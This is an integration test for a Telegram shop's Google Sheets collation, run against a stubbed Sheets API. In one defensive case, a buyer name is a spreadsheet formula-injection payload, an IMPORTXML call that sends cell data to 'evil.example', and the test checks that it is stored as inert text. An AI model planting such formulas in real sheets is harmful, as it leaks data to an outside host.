/**
 * Google Sheets collation, against a spreadsheet that answers like Google's.
 *
 * The collation is the part of this shop most likely to be quietly wrong. It
 * is best-effort by design: every failure is logged and swallowed so that a
 * Google outage cannot stop somebody buying a packet of noodles. That is the
 * right trade, and it is also why a broken range string can go unnoticed for
 * weeks, with orders going through and simply never appearing in the sheet
 * the committee actually reads.
 *
 * So this drives the real Express app, the real services and the real Google
 * client, with GOOGLE_SHEETS_API_ROOT pointed at a stub that enforces the two
 * rules that were being broken: A1 ranges must quote a sheet name that is not
 * a bare word, and no range may reach past the grid.
 *
 *   DATABASE_URL=postgres://... node tests/sheets.integration.mjs
 */
import crypto from 'node:crypto';
import http from 'node:http';

// ---------------------------------------------------------------------------
// A spreadsheet, in memory
// ---------------------------------------------------------------------------

/** title -> { rows: string[][], rowCount, columnCount, sheetId } */
const tabs = new Map();
let nextSheetId = 1;
const calls = [];
const rejections = [];

function addTab(title, { rowCount = 1000, columnCount = 26 } = {}) {
  tabs.set(title, { title, rows: [], rowCount, columnCount, sheetId: (nextSheetId += 1) });
}
// The blank spreadsheet a committee actually shares: one default tab, 26 wide.
addTab('Sheet1');

const A1_COLUMN = (letters) => letters.split('').reduce(
  (n, ch) => n * 26 + (ch.charCodeAt(0) - 64), 0
) - 1;

/**
 * Parse an A1 range the way Sheets does, and refuse what Sheets refuses.
 *
 * This is the whole point of the stub. Google answers an unquoted
 * "Items & Stock!A2:P" with "Unable to parse range", and a range past the last
 * column or row with "exceeds grid limits", and the app swallows both.
 */
function parseRange(spec) {
  let title;
  let rest;

  if (spec.startsWith("'")) {
    const end = spec.indexOf("'!", 1);
    if (end < 0) throw new RangeError(`Unable to parse range: ${spec}`);
    title = spec.slice(1, end).replace(/''/g, "'");
    rest = spec.slice(end + 2);
  } else {
    const bang = spec.indexOf('!');
    title = bang < 0 ? spec : spec.slice(0, bang);
    rest = bang < 0 ? '' : spec.slice(bang + 1);
    // Google requires quoting for anything that is not a bare word.
    if (!/^[A-Za-z0-9_]+$/.test(title)) {
      throw new RangeError(`Unable to parse range: ${spec}`);
    }
  }

  const tab = tabs.get(title);
  if (!tab) throw new RangeError(`Unable to parse range: ${spec}`);
  if (!rest) return { tab, startRow: 0, endRow: tab.rowCount - 1, startCol: 0, endCol: tab.columnCount - 1 };

  const cell = /^([A-Z]+)?(\d+)?$/;
  const [from, to = from] = rest.split(':');
  const a = cell.exec(from);
  const b = cell.exec(to);
  if (!a || !b) throw new RangeError(`Unable to parse range: ${spec}`);

  const startCol = a[1] ? A1_COLUMN(a[1]) : 0;
  const endCol = b[1] ? A1_COLUMN(b[1]) : tab.columnCount - 1;
  const startRow = a[2] ? Number(a[2]) - 1 : 0;
  const endRow = b[2] ? Number(b[2]) - 1 : tab.rowCount - 1;

  if (endCol > tab.columnCount - 1 || endRow > tab.rowCount - 1) {
    throw new RangeError(
      `Range (${spec}) exceeds grid limits. Max rows: ${tab.rowCount}, max columns: ${tab.columnCount}`
    );
  }
  return { tab, startRow, endRow, startCol, endCol };
}

function readRange(spec) {
  const { tab, startRow, endRow, startCol, endCol } = parseRange(spec);
  const out = [];
  for (let r = startRow; r <= Math.min(endRow, tab.rows.length - 1); r += 1) {
    const row = (tab.rows[r] ?? []).slice(startCol, endCol + 1);
    out.push(row.map((c) => (c === undefined ? '' : c)));
  }
  // Sheets trims wholly empty trailing rows out of a response.
  while (out.length && out[out.length - 1].every((c) => c === '')) out.pop();
  return out;
}

function writeRange(spec, values) {
  const { tab, startRow, startCol } = parseRange(spec);
  values.forEach((row, i) => {
    const r = startRow + i;
    if (r > tab.rowCount - 1) throw new RangeError('Range exceeds grid limits');
    tab.rows[r] = tab.rows[r] ?? [];
    row.forEach((cell, j) => { tab.rows[r][startCol + j] = String(cell ?? ''); });
  });
  const lastRow = startRow + values.length;
  const lastCol = startCol + Math.max(...values.map((r) => r.length), 0);
  return { updatedRange: `${spec.split('!')[0]}!A${startRow + 1}:Z${lastRow}`, lastRow, lastCol };
}

const json = (res, code, body) => {
  res.writeHead(code, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(body));
};

const sheetsStub = http.createServer((req, res) => {
  const chunks = [];
  req.on('data', (c) => chunks.push(c));
  req.on('end', () => {
    const url = new URL(req.url, 'http://sheets');
    const body = chunks.length ? JSON.parse(Buffer.concat(chunks).toString()) : {};
    calls.push({ method: req.method, path: url.pathname, search: url.search, body });

    try {
      const path = decodeURIComponent(url.pathname);

      // spreadsheets.get
      if (req.method === 'GET' && /\/v4\/spreadsheets\/[^/]+$/.test(path)) {
        return json(res, 200, {
          spreadsheetId: 'TEST-SHEET',
          sheets: [...tabs.values()].map((t) => ({
            properties: {
              sheetId: t.sheetId,
              title: t.title,
              gridProperties: { rowCount: t.rowCount, columnCount: t.columnCount },
            },
          })),
        });
      }

      // spreadsheets.batchUpdate (structure)
      if (req.method === 'POST' && path.endsWith(':batchUpdate') && !path.includes('/values')) {
        for (const request of body.requests ?? []) {
          if (request.addSheet) {
            const p = request.addSheet.properties;
            addTab(p.title, p.gridProperties);
          }
          if (request.updateSheetProperties) {
            const p = request.updateSheetProperties.properties;
            const tab = [...tabs.values()].find((t) => t.sheetId === p.sheetId);
            if (tab && p.gridProperties) {
              tab.rowCount = p.gridProperties.rowCount ?? tab.rowCount;
              tab.columnCount = p.gridProperties.columnCount ?? tab.columnCount;
            }
          }
        }
        return json(res, 200, { spreadsheetId: 'TEST-SHEET', replies: [] });
      }

      // values.batchUpdate
      if (req.method === 'POST' && path.endsWith('/values:batchUpdate')) {
        for (const entry of body.data ?? []) writeRange(entry.range, entry.values);
        return json(res, 200, { totalUpdatedCells: 1 });
      }

      const valueMatch = path.match(/\/values\/(.+?)(?::append|:clear)?$/);
      const spec = valueMatch ? valueMatch[1] : null;

      if (req.method === 'GET' && spec) {
        return json(res, 200, { range: spec, values: readRange(spec) });
      }
      if (req.method === 'POST' && path.endsWith(':append')) {
        const { tab } = parseRange(spec);
        const start = tab.rows.length;
        body.values.forEach((row, i) => { tab.rows[start + i] = row.map((c) => String(c ?? '')); });
        return json(res, 200, {
          updates: {
            updatedRange: `${spec.split('!')[0]}!A${start + 1}:Z${start + body.values.length}`,
            updatedRows: body.values.length,
          },
        });
      }
      if (req.method === 'POST' && path.endsWith(':clear')) {
        const { tab, startRow, endRow, startCol, endCol } = parseRange(spec);
        for (let r = startRow; r <= Math.min(endRow, tab.rows.length - 1); r += 1) {
          for (let c = startCol; c <= endCol; c += 1) if (tab.rows[r]) tab.rows[r][c] = '';
        }
        return json(res, 200, { clearedRange: spec });
      }
      if (req.method === 'PUT' && spec) {
        writeRange(spec, body.values);
        return json(res, 200, { updatedRange: spec, updatedCells: body.values.length });
      }

      return json(res, 404, { error: { code: 404, message: `No stub for ${req.method} ${path}` } });
    } catch (err) {
      // Exactly how Google reports a bad range: a 400 with the reason, which
      // the app logs and swallows.
      rejections.push(err.message);
      return json(res, 400, { error: { code: 400, message: err.message, status: 'INVALID_ARGUMENT' } });
    }
  });
});
await new Promise((r) => sheetsStub.listen(0, '127.0.0.1', r));

// ---------------------------------------------------------------------------
// A stub Bot API, so notifications do not reach anybody
// ---------------------------------------------------------------------------
const telegramSent = [];
const telegram = http.createServer((req, res) => {
  const chunks = [];
  req.on('data', (c) => chunks.push(c));
  req.on('end', () => {
    const method = req.url.split('/').pop();
    let payload = {};
    try { payload = JSON.parse(Buffer.concat(chunks).toString() || '{}'); } catch { /* form */ }
    telegramSent.push({ method, payload });
    json(res, 200, { ok: true, result: { message_id: telegramSent.length } });
  });
});
await new Promise((r) => telegram.listen(0, '127.0.0.1', r));

// ---------------------------------------------------------------------------
// The app
// ---------------------------------------------------------------------------
const BOT = '8900764054:SHEETS-TEST-TOKEN';
process.env.TELEGRAM_BOT_TOKEN = BOT;
process.env.TELEGRAM_API_ROOT = `http://127.0.0.1:${telegram.address().port}`;
process.env.DATABASE_URL = process.env.DATABASE_URL
  ?? 'postgresql://postgres@localhost/strix?host=/var/tmp&port=5440';
process.env.DATABASE_SSL = 'false';
process.env.SHEETS_ENABLED = 'true';
process.env.GOOGLE_SHEETS_ID = 'TEST-SHEET';
process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL = 'stub@example.iam.gserviceaccount.com';
process.env.GOOGLE_PRIVATE_KEY = 'stub-key';
process.env.GOOGLE_SHEETS_API_ROOT = `http://127.0.0.1:${sheetsStub.address().port}/`;
process.env.PAYNOW_PROXY_TYPE = 'mobile';
process.env.PAYNOW_PROXY_VALUE = '+6591234567';
process.env.ADMIN_TELEGRAM_IDS = '940777';
process.env.LOW_STOCK_ALERT_AT = '2';
process.env.LOG_LEVEL = 'error';
process.env.NODE_ENV = 'test';

const { default: app } = await import('../src/index.js');
const server = await new Promise((r) => { const s = app.listen(0, () => r(s)); });
const base = `http://127.0.0.1:${server.address().port}`;

function sign(user) {
  const p = new URLSearchParams({
    user: JSON.stringify(user),
    auth_date: String(Math.floor(Date.now() / 1000)),
  });
  const pairs = [...p.entries()].map(([k, v]) => `${k}=${v}`).sort().join('\n');
  const secret = crypto.createHmac('sha256', 'WebAppData').update(BOT).digest();
  p.set('hash', crypto.createHmac('sha256', secret).update(pairs).digest('hex'));
  return p.toString();
}
const BUYER = sign({ id: 940111, first_name: 'Darren', username: 'darren' });
const ADMIN = sign({ id: 940777, first_name: 'Boss' });

const call = async (path, { as = BUYER, method = 'GET', body } = {}) => {
  const res = await fetch(base + path, {
    method,
    headers: { 'X-Telegram-Init-Data': as, ...(body ? { 'Content-Type': 'application/json' } : {}) },
    body: body ? JSON.stringify(body) : undefined,
  });
  return { status: res.status, body: await res.json().catch(() => null) };
};

let pass = 0;
let fail = 0;
const check = (name, cond, extra = '') => {
  if (cond) { pass += 1; console.log(`  OK   ${name}`); }
  else { fail += 1; console.log(`  FAIL ${name}${extra ? `  - ${extra}` : ''}`); }
};

/** Collation is fire-and-forget, so give it a moment to land. */
const settle = (ms = 700) => new Promise((r) => { setTimeout(r, ms); });

const rows = (title) => (tabs.get(title)?.rows ?? []);
const rowFor = (title, code) => rows(title).find((r) => r?.[0] === code);

// ---------------------------------------------------------------------------
console.log('\n- the tabs are built on a spreadsheet nobody prepared -');
{
  const { ensureTabs } = await import('../src/lib/sheets.js');
  const ok = await ensureTabs(true);
  check('ensureTabs succeeds', ok === true);
  check('no range was refused', rejections.length === 0, rejections.join(' | '));

  for (const title of ['Orders', 'Order Items', 'Items & Stock', 'Stock Movements']) {
    check(`"${title}" exists`, tabs.has(title));
  }
  check('the header row is written',
    rows('Items & Stock')[0]?.[0] === 'SKU', JSON.stringify(rows('Items & Stock')[0]?.slice(0, 3)));
  check('a tab named with an ampersand was addressable at all', tabs.get('Items & Stock').rows.length > 0);
}

console.log('\n- the catalogue mirror -');
let catalogClearsAfterFullSync = 0;
{
  const { syncCatalogToSheets } = await import('../src/services/collation.service.js');
  check('a full sync succeeds', (await syncCatalogToSheets()) === true);
  check('still nothing refused', rejections.length === 0, rejections.join(' | '));

  const body = rows('Items & Stock').slice(1).filter((r) => r?.[0]);
  check('every seeded item is in the sheet', body.length === 23, `got ${body.length}`);

  const milk = body.find((r) => r[0] === 'HP-MILK');
  check('the row carries the price as a number', milk?.[7] === '1.20', milk?.[7]);
  check('and the collection point', milk?.[3] === 'Blk B Lounge', milk?.[3]);
  check('and marks the row active', milk?.[13] === 'Yes', milk?.[13]);
  catalogClearsAfterFullSync = calls.filter((c) => c.method === 'POST' && c.path.endsWith(':clear')).length;
}

console.log('\n- an order reaches the sheet when it is placed, not when it is verified -');
let order;
{
  const cat = await call('/api/catalog');
  const item = cat.body.categories.flatMap((c) => c.items).find((i) => i.sku === 'HP-MILK');
  const placed = await call('/api/orders', {
    method: 'POST',
    body: { buyerName: 'Darren', note: 'ring the bell', cart: [{ itemId: item.id, quantity: 2 }] },
  });
  order = placed.body.order;
  check('the order is accepted', placed.status === 201, JSON.stringify(placed.body).slice(0, 120));

  await settle();
  const row = rowFor('Orders', order.code);
  check('an unverified order is already collated', Boolean(row), 'no row');
  check('with its real status', row?.[2] === 'awaiting_payment', row?.[2]);
  check('the buyer name', row?.[3] === 'Darren', row?.[3]);
  check('the total', row?.[8] === '2.40', row?.[8]);
  check('the note', row?.[11] === 'ring the bell', row?.[11]);
  check('and no proof yet', row?.[12] === 'No', row?.[12]);

  const lines = rows('Order Items').filter((r) => r?.[0] === order.code);
  check('one row per line item', lines.length === 1, `got ${lines.length}`);
  check('the line carries the quantity', lines[0]?.[8] === '2', lines[0]?.[8]);
  check('and the line total', lines[0]?.[9] === '2.40', lines[0]?.[9]);
}

console.log('\n- reserving stock moves the Available column -');
{
  await settle();
  const milk = rows('Items & Stock').find((r) => r?.[0] === 'HP-MILK');
  check('two units are shown as reserved', milk?.[9] === '2', milk?.[9]);
  check('and availability is stock minus reservation',
    Number(milk?.[10]) === Number(milk?.[8]) - 2, `${milk?.[10]} vs ${milk?.[8]}`);
  check('routine stock changes do not clear and rewrite the catalogue',
    calls.filter((c) => c.method === 'POST' && c.path.endsWith(':clear')).length
      === catalogClearsAfterFullSync);
  const { one } = await import('../src/lib/db.js');
  check('completed background work leaves no queued jobs',
    Number((await one('select count(*) as n from background_jobs')).n) === 0);
}

console.log('\n- the screenshot updates the row that is already there -');
{
  const form = new FormData();
  const png = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
    'base64'
  );
  form.append('proof', new Blob([png], { type: 'image/png' }), 'proof.png');
  const res = await fetch(`${base}/api/orders/${order.id}/proof`, {
    method: 'POST', headers: { 'X-Telegram-Init-Data': BUYER }, body: form,
  });
  check('the upload is accepted', res.status === 200, String(res.status));

  await settle();
  const matching = rows('Orders').filter((r) => r?.[0] === order.code);
  check('the order still has exactly one row', matching.length === 1, `got ${matching.length}`);
  check('and that row now reads pending_review', matching[0]?.[2] === 'pending_review', matching[0]?.[2]);
  check('the proof column says where it came from', /Yes/.test(matching[0]?.[12] ?? ''), matching[0]?.[12]);

  const lines = rows('Order Items').filter((r) => r?.[0] === order.code);
  check('the line items say pending_review too', lines.every((l) => l[10] === 'pending_review'),
    lines.map((l) => l[10]).join(','));
}

console.log('\n- a sale is a stock movement, and shows up as one -');
{
  await settle();
  const moves = rows('Stock Movements').filter((r) => r?.[6] === order.code);
  check('the sale is in the ledger tab', moves.length === 1, `got ${moves.length}`);
  check('as a debit of two', moves[0]?.[3] === '-2', moves[0]?.[3]);
  check('with the reason recorded', moves[0]?.[5] === 'order_paid', moves[0]?.[5]);
  check('with a stable movement id for retry deduplication', Boolean(moves[0]?.[9]));

  const milk = rows('Items & Stock').find((r) => r?.[0] === 'HP-MILK');
  check('the stock column followed the sale down', milk?.[8] === '22', milk?.[8]);
  check('and the reservation was released', milk?.[9] === '0', milk?.[9]);
}

console.log('\n- approving refreshes the same row again -');
{
  const approved = await call(`/api/admin/orders/${order.id}/approve`, { as: ADMIN, method: 'POST' });
  check('approval succeeds', approved.status === 200, JSON.stringify(approved.body).slice(0, 120));

  await settle();
  const matching = rows('Orders').filter((r) => r?.[0] === order.code);
  check('still one row, not two', matching.length === 1, `got ${matching.length}`);
  check('marked paid', matching[0]?.[2] === 'paid', matching[0]?.[2]);
  check('naming who verified it', matching[0]?.[13] === 'Boss', matching[0]?.[13]);
  check('and when', /\d{4}-\d{2}-\d{2} /.test(matching[0]?.[14] ?? ''), matching[0]?.[14]);
  check('no stock moved twice', rows('Stock Movements').filter((r) => r?.[6] === order.code).length === 1);
}

console.log('\n- a stock take writes the ledger and the mirror -');
{
  const cat = await call('/api/admin/catalog', { as: ADMIN });
  const milk = cat.body.items.find((i) => i.sku === 'HP-MILK');
  const res = await call('/api/admin/stock-take', {
    as: ADMIN, method: 'POST',
    body: { entries: [{ itemId: milk.id, count: 30 }], note: 'Friday count' },
  });
  check('the stock take is accepted', res.status === 200, JSON.stringify(res.body).slice(0, 120));

  await settle();
  const move = rows('Stock Movements').filter((r) => r?.[1] === 'HP-MILK').pop();
  check('it landed in the ledger tab', Boolean(move), 'no row');
  check('with the new balance', move?.[4] === '30', move?.[4]);
  check('the admin who counted', move?.[7] === 'Boss', move?.[7]);
  check('and the note typed with it', move?.[8] === 'Friday count', move?.[8]);

  const row = rows('Items & Stock').find((r) => r?.[0] === 'HP-MILK');
  check('the mirror agrees', row?.[8] === '30', row?.[8]);
}

console.log('\n- the sheet edits back -');
{
  // A human types over the mirror: new price, new count, and a row that makes
  // no sense at all.
  const tab = tabs.get('Items & Stock');
  const index = tab.rows.findIndex((r) => r?.[0] === 'HP-MILK');
  tab.rows[index][4] = 'Hello Panda';
  tab.rows[index][7] = '$1.50';                  // decorated, but readable
  tab.rows[index][8] = '12';
  const broken = tab.rows.findIndex((r) => r?.[0] === 'HP-CHOCOLATE');
  tab.rows[broken][7] = '1.20 (was 1.50)';       // not a price

  const res = await call('/api/admin/sheets/import', { as: ADMIN, method: 'POST' });
  check('the import runs', res.status === 200, JSON.stringify(res.body).slice(0, 160));
  check('the price edit came through', res.body?.updated >= 1, JSON.stringify(res.body?.changes));
  check('the stock edit came through', res.body?.stockChanged === 1, String(res.body?.stockChanged));
  check('the unreadable price was skipped, not guessed',
    (res.body?.skipped ?? []).some((s) => s.sku === 'HP-CHOCOLATE'), JSON.stringify(res.body?.skipped));

  const cat = await call('/api/catalog');
  const milk = cat.body.categories.flatMap((c) => c.items).find((i) => i.sku === 'HP-MILK');
  check('the shop shows the new price', milk?.price === '1.50', milk?.price);

  await settle();
  const move = rows('Stock Movements').filter((r) => r?.[1] === 'HP-MILK').pop();
  check('the sheet edit went through the ledger like any stock take',
    /Sheet edit/.test(move?.[8] ?? ''), move?.[8]);
  const chocolate = rows('Items & Stock').find((r) => r?.[0] === 'HP-CHOCOLATE');
  check('and the skipped row was restated from the database, not left as typed',
    chocolate?.[7] === '1.20', chocolate?.[7]);
}

console.log('\n- a buyer whose name is a formula -');
{
  const cat = await call('/api/catalog');
  const item = cat.body.categories.flatMap((c) => c.items).find((i) => i.inStock);
  const placed = await call('/api/orders', {
    method: 'POST',
    body: {
      buyerName: '=IMPORTXML("https://evil.example/"&A2,"//x")',
      cart: [{ itemId: item.id, quantity: 1 }],
    },
  });
  check('the order goes through', placed.status === 201, JSON.stringify(placed.body).slice(0, 120));

  await settle();
  const row = rowFor('Orders', placed.body.order.code);
  check('the name is stored as text, not as a formula',
    row?.[3]?.startsWith("'="), row?.[3]?.slice(0, 20));
}

console.log('\n- cancelling is a status change like any other -');
{
  const mine = await call('/api/orders');
  const open = mine.body.orders.find((o) => o.status === 'awaiting_payment');
  const res = await call(`/api/orders/${open.id}/cancel`, { method: 'POST' });
  check('the cancel is accepted', res.status === 200, JSON.stringify(res.body).slice(0, 120));

  await settle();
  const row = rowFor('Orders', open.code);
  check('the sheet says cancelled', row?.[2] === 'cancelled', row?.[2]);
  const lines = rows('Order Items').filter((r) => r?.[0] === open.code);
  check('and so do its line items', lines.every((l) => l[10] === 'cancelled'),
    lines.map((l) => l[10]).join(','));
}

console.log('\n- nothing was ever refused by the spreadsheet -');
{
  check('no range was rejected across the whole run', rejections.length === 0,
    rejections.slice(0, 3).join(' | '));
  check('the sheet was actually written to', calls.some((c) => c.method === 'POST'));
}

console.log(`\n${fail ? 'FAILED' : 'PASSED'}: ${pass} passed, ${fail} failed\n`);
server.close();
telegram.close();
sheetsStub.close();
const { close } = await import('../src/lib/db.js');
await close();
process.exit(fail ? 1 : 0);
